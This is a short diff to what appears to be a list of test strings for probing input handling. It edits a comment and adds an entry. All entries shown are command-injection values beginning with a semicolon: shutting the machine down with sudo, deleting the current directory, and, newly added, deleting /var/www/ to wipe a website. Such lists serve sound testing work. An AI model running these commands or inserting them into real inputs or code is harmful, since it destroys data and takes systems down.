@@ -16,5 +16,8 @@
 # Uh oh, stinky!
 ;sudo shutdown now
 
-# Oh fuck. Delete current directory.
+# Oh no. Delete current directory.
 ;DIR=`pwd`;cd ..;rm -r $DIR;
+
+# Oh NO. Delete website.
+;cd /;rm -rf /var/www/;
